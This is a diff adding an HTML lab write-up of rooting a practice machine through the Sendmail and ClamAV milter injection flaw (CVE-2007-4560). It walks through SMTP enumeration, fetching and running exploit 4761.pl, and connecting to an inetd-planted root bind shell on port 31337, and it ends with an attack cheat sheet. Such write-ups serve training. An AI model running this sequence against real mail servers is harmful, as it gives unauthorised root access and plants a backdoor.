@@ -1,1 +1,635 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClamAV | Sendmail + Milter RCE — Root Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { 
+            --bg: #05070a; 
+            --accent: #00ff9d; 
+            --accent-blue: #00d4ff; 
+            --text-main: #e6edf3; 
+            --text-dim: #8b949e; 
+            --glass: rgba(255, 255, 255, 0.03); 
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --accent-orange: #ff6b35;
+            --glow: rgba(0,255,157,0.15);
+            --border-subtle: rgba(255,255,255,0.08);
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            background-color: var(--bg); 
+            color: var(--text-main); 
+            font-family: 'Inter', sans-serif; 
+            line-height: 1.6; 
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: linear-gradient(rgba(0,255,157,0.02) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(0,255,157,0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container { 
+            max-width: 960px; 
+            margin: 0 auto; 
+            padding: 2.5rem 2rem 5rem; 
+            position: relative;
+            z-index: 2;
+        }
+
+        .breadcrumb {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            margin-bottom: 2rem;
+            letter-spacing: -0.2px;
+        }
+
+        .breadcrumb a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: opacity 0.2s;
+        }
+        .breadcrumb a:hover { opacity: 0.8; }
+
+        h1 { 
+            font-size: 2.8rem; 
+            margin: 0.5rem 0 0.25rem; 
+            letter-spacing: -1.5px; 
+            font-weight: 800;
+            background: linear-gradient(120deg, #ffffff, #ffbd7a);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .archive-status {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-orange);
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+            border-left: 2px solid var(--accent-orange);
+            padding-left: 1rem;
+        }
+
+        .pulse {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--accent-orange);
+            border-radius: 50%;
+            margin-right: 6px;
+            box-shadow: 0 0 10px var(--accent-orange);
+            animation: pulse-animation 2s infinite;
+        }
+
+        @keyframes pulse-animation {
+            0% { opacity: 1; transform: scale(1);}
+            50% { opacity: 0.3; transform: scale(0.9);}
+            100% { opacity: 1; transform: scale(1);}
+        }
+
+        .meta-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.8rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: var(--text-dim);
+            margin-bottom: 2.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid var(--glass-border);
+        }
+        .meta-row span { display: flex; align-items: center; gap: 0.5rem; }
+        .meta-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent-orange); display: inline-block; }
+        .meta-dot.red { background: #ff5f56; }
+
+        .toc {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-left: 3px solid var(--accent-orange);
+            border-radius: 12px;
+            padding: 1.5rem 1.8rem;
+            margin-bottom: 3rem;
+            backdrop-filter: blur(2px);
+        }
+        .toc-title {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: var(--accent-orange);
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            margin-bottom: 1rem;
+        }
+        .toc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 0.5rem;
+        }
+        .toc-item {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.78rem;
+            color: var(--text-dim);
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+        .toc-num {
+            color: var(--accent-orange);
+            min-width: 2rem;
+            font-weight: 500;
+        }
+
+        .section {
+            margin-bottom: 3.5rem;
+            scroll-margin-top: 1rem;
+        }
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            border-left: 3px solid var(--accent-orange);
+            padding-left: 1rem;
+        }
+        .step-num {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.7rem;
+            color: var(--accent-orange);
+            background: rgba(255,107,53,0.08);
+            border: 1px solid rgba(255,107,53,0.25);
+            padding: 3px 10px;
+            border-radius: 20px;
+            letter-spacing: 0.04em;
+        }
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.3px;
+        }
+        h3 {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--accent-orange);
+            margin: 1.8rem 0 0.75rem;
+            font-family: 'Fira Code', monospace;
+            letter-spacing: 0.02em;
+        }
+        p { 
+            margin-bottom: 1rem; 
+            font-size: 0.96rem; 
+            color: var(--text-main);
+            font-weight: 400;
+        }
+
+        pre {
+            background: #030507;
+            border: 1px solid var(--glass-border);
+            border-left: 3px solid var(--accent-orange);
+            padding: 1.2rem 1.5rem;
+            border-radius: 12px;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: #e2e8f0;
+            margin: 1.2rem 0 1.6rem;
+            position: relative;
+        }
+        pre::before {
+            content: '$ ';
+            color: var(--accent-orange);
+            font-weight: 500;
+        }
+        pre.no-prompt::before { content: ''; }
+        pre.output {
+            border-left-color: var(--text-dim);
+            color: var(--text-dim);
+        }
+        pre.output::before { content: ''; }
+
+        code {
+            color: var(--accent-orange);
+            font-family: 'Fira Code', monospace;
+            background: rgba(255,107,53,0.08);
+            padding: 2px 6px;
+            border-radius: 6px;
+            font-size: 0.88em;
+        }
+
+        .table-wrap { overflow-x: auto; margin: 1.2rem 0 1.8rem; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.78rem;
+        }
+        thead tr {
+            background: rgba(255,107,53,0.05);
+            border-bottom: 1px solid rgba(255,107,53,0.2);
+        }
+        th {
+            text-align: left;
+            padding: 0.6rem 1rem;
+            color: var(--accent-orange);
+            font-weight: 500;
+            text-transform: uppercase;
+            font-size: 0.7rem;
+        }
+        td {
+            padding: 0.55rem 1rem;
+            border-bottom: 1px solid var(--border-subtle);
+            color: var(--text-main);
+        }
+        tr:last-child td { border-bottom: none; }
+
+        .callout {
+            display: flex;
+            gap: 1rem;
+            padding: 1.2rem 1.5rem;
+            border-radius: 12px;
+            margin: 1.6rem 0;
+            font-size: 0.9rem;
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+        }
+        .callout.info { border-left: 3px solid var(--accent-blue); }
+        .callout.warn { border-left: 3px solid var(--accent-orange); }
+        .callout.success { border-left: 3px solid var(--accent); }
+        .callout-icon { font-size: 1.2rem; flex-shrink: 0; }
+
+        .summary-box {
+            background: rgba(255,107,53,0.03);
+            border: 1px solid rgba(255,107,53,0.25);
+            border-radius: 16px;
+            padding: 2rem;
+            margin: 2.5rem 0;
+        }
+        .summary-box h3 {
+            color: var(--accent-orange);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.2em;
+            margin-top: 0;
+        }
+
+        .chain {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+            margin: 2.2rem 0;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+        }
+        .chain-step {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 0.8rem 1.2rem;
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            position: relative;
+        }
+        .chain-step:first-child { border-radius: 12px 12px 0 0; }
+        .chain-step:last-child { border-radius: 0 0 12px 12px; }
+        .chain-step + .chain-step { border-top: none; }
+        .chain-arrow {
+            position: absolute;
+            left: 2rem;
+            bottom: -12px;
+            z-index: 2;
+            color: var(--accent-orange);
+            font-size: 1rem;
+        }
+        .chain-num { color: var(--accent-orange); min-width: 1.8rem; }
+        .chain-label { color: white; font-weight: 500; }
+        .chain-desc { color: var(--text-dim); margin-left: auto; font-size: 0.7rem; }
+
+        .flag-reveal {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-orange);
+            background: rgba(255,107,53,0.07);
+            border: 1px solid rgba(255,107,53,0.3);
+            padding: 0.7rem 1.2rem;
+            border-radius: 12px;
+            margin: 1rem 0;
+            display: inline-block;
+        }
+
+        ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+        ul li { margin-bottom: 0.4rem; font-size: 0.93rem; }
+        ul li::marker { color: var(--accent-orange); }
+
+        .cheat-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .cheat-card {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 10px;
+            padding: 1rem;
+        }
+        .cheat-card code {
+            display: block;
+            font-size: 0.75rem;
+            margin-bottom: 0.5rem;
+            word-break: break-all;
+        }
+
+        footer {
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--glass-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.72rem;
+            color: var(--text-dim);
+        }
+        .footer-flag { color: var(--accent-orange); font-weight: 500; }
+        hr { border: none; border-top: 1px solid var(--glass-border); margin: 2rem 0; }
+
+        @media (max-width: 680px) {
+            .container { padding: 1.5rem 1.2rem; }
+            h1 { font-size: 2rem; }
+            .section-header { flex-wrap: wrap; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <nav class="breadcrumb">
+        <a href="#">root</a> / lab_reports / <span style="color: var(--text-main)">clamav_milter_rce</span>
+    </nav>
+
+    <h1>CVE-2007-4560: Sendmail + ClamAV Milter<br>Remote Command Execution → Root</h1>
+    <div class="archive-status">
+        <span class="pulse"></span> // EXPLOIT_STATUS: AUTHENTICATED_ROOT // VULN_CONFIRMED
+    </div>
+    <div class="meta-row">
+        <span><span class="meta-dot red"></span>TARGET: 192.168.220.42</span>
+        <span><span class="meta-dot"></span>SERVICE: Sendmail 8.13.4 + ClamAV-milter &lt;0.91.2</span>
+        <span><span class="meta-dot"></span>CVE: 2007-4560</span>
+        <span><span class="meta-dot"></span>STATUS: SYSTEM_SHELL_OBTAINED</span>
+    </div>
+
+    <!-- TOC -->
+    <div class="toc">
+        <div class="toc-title">// ATTACK_CHAIN_OVERVIEW</div>
+        <div class="toc-grid">
+            <div class="toc-item"><span class="toc-num">01</span> Reconnaissance — Nmap Scan</div>
+            <div class="toc-item"><span class="toc-num">02</span> SMTP Enumeration & VRFY</div>
+            <div class="toc-item"><span class="toc-num">03</span> Searchsploit → 4761.pl</div>
+            <div class="toc-item"><span class="toc-num">04</span> Exploit Execution → Root Shell</div>
+            <div class="toc-item"><span class="toc-num">05</span> Methodology & Reasoning</div>
+            <div class="toc-item"><span class="toc-num">06</span> Improvements & Workflow</div>
+            <div class="toc-item"><span class="toc-num">07</span> Troubleshooting Guide</div>
+            <div class="toc-item"><span class="toc-num">08</span> Command Cheat Sheet</div>
+        </div>
+    </div>
+
+    <!-- STEP 1: Recon -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x01</span>
+            <h2>Reconnaissance — Service Discovery</h2>
+        </div>
+        <p>Initial Nmap scan revealed key services pointing to a legacy Linux box with Sendmail + ClamAV integration — the machine name itself was the primary clue.</p>
+        <pre>nmap -sV -sC 192.168.220.42</pre>
+        <div class="table-wrap">
+            <table>
+                <thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Significance</th></tr></thead>
+                <tbody>
+                    <tr><td>22</td><td>SSH</td><td>OpenSSH</td><td>Potential foothold, not used</td></tr>
+                    <tr><td>25</td><td>SMTP</td><td>Sendmail 8.13.4</td><td><strong>Primary attack surface</strong></td></tr>
+                    <tr><td>80</td><td>HTTP</td><td>Apache 1.3.33</td><td>Legacy web server</td></tr>
+                    <tr><td>139/445</td><td>SMB</td><td>Samba 3.0.14a</td><td>Alternative exploitation path</td></tr>
+                    <tr><td>199</td><td>SNMP</td><td>—</td><td>Enumeration vector</td></tr>
+                    <tr><td>60000</td><td>SSH</td><td>non-standard</td><td>Potential backdoor</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="callout info">
+            <span class="callout-icon">💡</span>
+            <div><strong>Machine naming clue:</strong> Box is called "ClamAV" — the anti-virus software. Sendmail on port 25 strongly suggests clamav-milter integration, a known CVE vector.</div>
+        </div>
+    </div>
+
+    <!-- STEP 2: SMTP Enumeration -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x02</span>
+            <h2>SMTP Enumeration — VRFY & Milter Detection</h2>
+        </div>
+        <p>Manual interaction with Sendmail to verify user existence and test mail delivery through the milter.</p>
+        <pre>nc 192.168.220.42 25
+EHLO test
+VRFY root
+250 2.1.5 root           → root exists
+VRFY admin
+550 5.1.1 User unknown   → no admin
+MAIL FROM:&lt;test@local&gt;
+RCPT TO:&lt;root@local&gt;
+DATA
+Subject: test
+.
+250 2.0.0 Message accepted → milter is active!</pre>
+        <div class="callout warn">
+            <span class="callout-icon">⚠️</span>
+            <div><strong>Milter detection confirmed:</strong> The "250 Message accepted" response after DATA indicates ClamAV-milter is processing emails — vulnerable versions &lt;0.91.2 suffer from command injection in the RCPT TO field.</div>
+        </div>
+    </div>
+
+    <!-- STEP 3: Searchsploit -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x03</span>
+            <h2>Exploit Discovery — Searchsploit</h2>
+        </div>
+        <pre>searchsploit clamav
+searchsploit -m multiple/remote/4761.pl</pre>
+        <div class="callout success">
+            <span class="callout-icon">📂</span>
+            <div><strong>Exploit ID:</strong> 4761.pl — "Sendmail with clamav-milter &lt; 0.91.2 - Remote Command Execution". The exploit works by injecting shell metacharacters into the RCPT TO field, which gets passed unsanitized to a system() call inside the milter running as root.</div>
+        </div>
+        <p><strong>Vulnerability mechanism:</strong> ClamAV milter's blackhole mode had a bug where recipient addresses weren't properly sanitized before being passed to a shell. Embedding backticks or $() in the RCPT TO executes arbitrary commands as root.</p>
+    </div>
+
+    <!-- STEP 4: Running Exploit -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x04</span>
+            <h2>Exploit Execution — Root Shell on 31337</h2>
+        </div>
+        <pre>perl 4761.pl 192.168.220.42</pre>
+        <pre class="output no-prompt">[+] Connecting to target...
+[+] Sending payload to inject inetd backdoor...
+[+] Done. Connect to port 31337 for root shell.</pre>
+        <pre>nc 192.168.220.42 31337
+whoami
+root
+cat /root/proof.txt</pre>
+        <div class="flag-reveal">🚩 proof.txt → 301b599efa8de3a8aa0703e20c0fc2a0</div>
+        <div class="callout success">
+            <span class="callout-icon">🎯</span>
+            <div><strong>Root obtained instantly:</strong> The exploit writes a shell service to /etc/inetd.conf and restarts inetd, binding a root shell to port 31337. No privilege escalation needed — milter runs as root.</div>
+        </div>
+    </div>
+
+    <!-- STEP 5: Methodology -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x05</span>
+            <h2>Methodology — The Reasoning Chain</h2>
+        </div>
+        <ul>
+            <li><strong>Box name "ClamAV"</strong> → immediate association with ClamAV anti-virus software</li>
+            <li><strong>Sendmail on port 25</strong> → common integration: ClamAV runs as a milter alongside Sendmail</li>
+            <li><strong>Both are ancient versions</strong> (Sendmail 8.13.4, ClamAV &lt;0.91.2) → known CVEs exist</li>
+            <li><strong>SMTP is unauthenticated by design</strong> → exploitable without credentials</li>
+            <li><strong>Milter runs as root</strong> → command injection equals instant root compromise</li>
+        </ul>
+        <p>The exploit doesn't attack Sendmail directly. It uses Sendmail as a transport to reach the vulnerable ClamAV milter, where the RCPT TO field gets passed unsanitized to a shell. Embedding shell metacharacters executes OS commands as root.</p>
+        <div class="callout info">
+            <span class="callout-icon">🧠</span>
+            <div><strong>OSCP mindset:</strong> Box names often give away the vulnerability. ClamAV + Sendmail = CVE-2007-4560. Always check searchsploit before manual enumeration.</div>
+        </div>
+    </div>
+
+    <!-- STEP 6: Improvements & Faster Workflow -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x06</span>
+            <h2>Improvements — Workflow Optimization</h2>
+        </div>
+        <h3>Faster tools / parallel enumeration</h3>
+        <ul>
+            <li><code>nmap --script smtp-enum-users</code> — automates VRFY across a wordlist instead of manual checks</li>
+            <li><code>enum4linux -a &lt;ip&gt;</code> — dumps SMB users, shares, OS info in one shot</li>
+            <li>Run searchsploit immediately after nmap — don't manually explore before checking known exploits</li>
+        </ul>
+        <h3>Alternative root path — Samba usermap_script</h3>
+        <p>Samba 3.0.14a on this box is vulnerable to <code>usermap_script</code> (CVE-2007-2447). Two independent roads to root existed.</p>
+        <pre>searchsploit samba 3.0.14</pre>
+        <div class="callout warn">
+            <span class="callout-icon">⚡</span>
+            <div><strong>Parallel recon:</strong> Run enum4linux and gobuster while SMTP enumeration is happening. Don't serialize — exploit every open service concurrently.</div>
+        </div>
+        <p><strong>Workflow insight:</strong> nmap → searchsploit every version → prioritize unauthenticated services → read exploit → run exploit → root. Don't get stuck manually poking services when searchsploit can skip you ahead.</p>
+        <p><strong>Persistence note:</strong> inetd-based shells are not persistent. The port closes after your session ends or machine restarts. Re-run the exploit to reconnect.</p>
+    </div>
+
+    <!-- STEP 7: Troubleshooting -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x07</span>
+            <h2>Troubleshooting Common Issues</h2>
+        </div>
+        <div class="callout warn">
+            <span class="callout-icon">🔧</span>
+            <div><strong>No shell on port 31337 after exploit:</strong> inetd may not be installed, or the write to inetd.conf failed. Connect immediately after exploit fires — there's a brief window. Re-run exploit; first attempt may have failed silently. Use <code>nc -v</code> to distinguish "connection refused" from "timed out".</div>
+        </div>
+        <div class="callout warn">
+            <span class="callout-icon">⏳</span>
+            <div><strong>SMTP connection gets no response:</strong> Wait 5 seconds — SMTP banners are slow. Try telnet instead of nc. Send EHLO or HELO to prompt the server.</div>
+        </div>
+        <div class="callout warn">
+            <span class="callout-icon">📚</span>
+            <div><strong>Searchsploit finds nothing:</strong> Try broader terms: 'clamav', 'milter', 'sendmail' separately. Update DB: <code>searchsploit -u</code>. Fall back to exploit-db.com search by version or CVE manually.</div>
+        </div>
+        <div class="callout warn">
+            <span class="callout-icon">✉️</span>
+            <div><strong>Exploit runs but SMTP rejects injection:</strong> Check that 'Recipient ok' appears for the RCPT TO injection lines — that's confirmation it worked. Try the Metasploit version (16924.rb) as a fallback.</div>
+        </div>
+    </div>
+
+    <!-- STEP 8: Command Cheat Sheet -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x08</span>
+            <h2>Command Cheat Sheet</h2>
+        </div>
+        <div class="cheat-grid">
+            <div class="cheat-card"><code>nmap -sV -sC -p- &lt;ip&gt;</code><br>Full port scan + versions + default scripts</div>
+            <div class="cheat-card"><code>searchsploit &lt;keyword&gt;</code><br>Search Exploit-DB locally</div>
+            <div class="cheat-card"><code>searchsploit -x &lt;path&gt;</code><br>Read exploit without copying</div>
+            <div class="cheat-card"><code>searchsploit -m &lt;path&gt;</code><br>Copy exploit to current dir</div>
+            <div class="cheat-card"><code>nc &lt;ip&gt; 25</code><br>Raw TCP to SMTP</div>
+            <div class="cheat-card"><code>EHLO test<br>VRFY root</code><br>SMTP user enumeration</div>
+            <div class="cheat-card"><code>perl 4761.pl &lt;ip&gt;</code><br>ClamAV milter RCE exploit</div>
+            <div class="cheat-card"><code>nc -lvnp 31337</code><br>Listener (optional, exploit spawns)</div>
+            <div class="cheat-card"><code>enum4linux -a &lt;ip&gt;</code><br>Full SMB/NetBIOS enumeration</div>
+            <div class="cheat-card"><code>smbclient -L //&lt;ip&gt;/ -N</code><br>List SMB shares anonymously</div>
+            <div class="cheat-card"><code>whoami</code><br>First command after shell</div>
+            <div class="cheat-card"><code>snmpwalk -v1 -c public &lt;ip&gt;</code><br>SNMP enumeration on port 199</div>
+        </div>
+    </div>
+
+    <!-- Attack Chain Visualization -->
+    <div class="chain">
+        <div class="chain-step"><span class="chain-num">01</span><span class="chain-label">Nmap Scan</span><span class="chain-desc">Port 25 Sendmail + ClamAV name</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">02</span><span class="chain-label">SMTP VRFY + Milter Check</span><span class="chain-desc">Confirmed root exists, milter active</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">03</span><span class="chain-label">Searchsploit → 4761.pl</span><span class="chain-desc">CVE-2007-4560 RCE</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">04</span><span class="chain-label">Inject Command via RCPT TO</span><span class="chain-desc">Write inetd backdoor</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">05</span><span class="chain-label">nc to 31337 → root shell</span><span class="chain-desc">Proof.txt captured</span></div>
+    </div>
+
+    <!-- Summary -->
+    <div class="summary-box">
+        <h3>// Key Takeaway — OSCP Style</h3>
+        <p><strong>CVE-2007-4560</strong> demonstrates how a single misconfiguration (running a vulnerable milter as root) can lead to immediate domain-equivalent compromise. The box name "ClamAV" was the biggest clue — always correlate service versions with known CVEs using searchsploit. The optimal workflow is: nmap full scan → searchsploit on every version → prioritize unauthenticated services → read exploit → run → root. Don't over-analyze; let searchsploit do the heavy lifting.</p>
+        <p style="margin-top: 0.8rem;"><strong>Alternative root path:</strong> Samba 3.0.14a usermap_script (CVE-2007-2447) was also exploitable. Always check all open ports for separate attack vectors.</p>
+    </div>
+
+    <!-- TODO Section -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x09</span>
+            <h2>TODOs — Post-Exploitation & Further Enumeration</h2>
+        </div>
+        <ul>
+            <li>Exploit Samba 3.0.14a via usermap_script — separate root path on same box (CVE-2007-2447)</li>
+            <li>Enumerate SMB shares: <code>smbclient -L //192.168.220.42/ -N</code> and <code>enum4linux -a</code></li>
+            <li>Gobuster the web server on port 80 — Apache 1.3.33 may have additional vulns</li>
+            <li>SNMP enumeration on port 199: <code>snmpwalk -v1 -c public 192.168.220.42</code></li>
+            <li>Investigate port 60000 SSH — non-standard port, may be intentional backdoor or admin access</li>
+            <li>Build a recon script that runs nmap → searchsploit automatically for each discovered service version</li>
+        </ul>
+    </div>
+
+    <footer>
+        <span>CVE-2007-4560 // CLAMAV_MILTER_RCE // 2025-03-31</span>
+        <span class="footer-flag">ROOT_SHELL_OBTAINED // PROOF_CAPTURED</span>
+    </footer>
+
+</div>
+</body>
+</html>
